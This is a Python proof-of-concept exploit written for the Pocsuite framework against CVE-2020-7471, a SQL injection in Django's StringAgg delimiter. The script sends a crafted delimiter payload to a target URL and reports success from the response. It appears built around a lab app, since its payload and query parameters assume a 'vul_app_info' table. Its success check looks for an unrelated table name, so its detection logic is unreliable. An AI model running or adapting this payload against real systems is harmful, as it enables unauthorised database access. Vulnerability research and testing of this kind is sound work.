#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import register, Output, POCBase
from pocsuite.thirdparty.guanxing import parse_url

class CVE_2020_7471_POC(POCBase):
    vulID = 'CVE-2020-7471'
    cveID = 'CVE-2020-7471'
    version = '1.0'
    author = '陆皓喆'
    vulDate = '2020-02-03'
    createDate = '2024-07-25'
    updateTime = '2024-07-25'
    name = 'Django SQL Injection Vulnerability'
    desc = '''
        This is a POC for Django SQL Injection vulnerability (CVE-2020-7471).
        Vulnerable versions of Django allow attackers to inject SQL statements via 
        the 'delimiter' parameter in the StringAgg aggregate function.
    '''
    severity = 'High'
    vulType = 'SQL Injection'
    references = ['https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7471']

    def _verify(self):
        # Parse the target URL
        self.url = parse_url(self.target)['url']

        # Define the payload for the SQL injection
        payload = '-\') AS "mydefinedname" FROM "vul_app_info" GROUP BY "vul_app_info"."gender" LIMIT 1 OFFSET 1 -- '

        # Construct the vulnerable query
        query = f"?order_by=id&aggregate_by=id&delimiter={payload}"

        # Make the request to the target URL with the payload
        resp = req.get(self.url + query)

        # Check if the response contains the table name of 'django_content_type'
        if 'django_content_type' in resp.text:
            return {
                'VerifyInfo': {
                    'URL': self.url,
                    'Vulnerable': True
                }
            }

        return {'VerifyInfo': {'Vulnerable': False}}

    def _attack(self):
        # The attack function can be the same as the verify function for this POC
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result['VerifyInfo']['Vulnerable']:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output

register(CVE_2020_7471_POC)